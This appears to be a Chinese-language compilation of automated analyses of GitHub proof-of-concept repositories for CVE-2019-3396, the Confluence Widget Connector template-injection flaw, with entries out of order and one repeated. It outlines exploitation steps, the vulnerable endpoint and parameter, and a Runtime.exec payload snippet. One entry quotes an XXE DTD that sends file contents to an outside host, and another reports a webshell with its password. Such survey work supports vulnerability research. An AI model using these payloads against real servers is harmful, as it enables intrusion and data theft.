*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

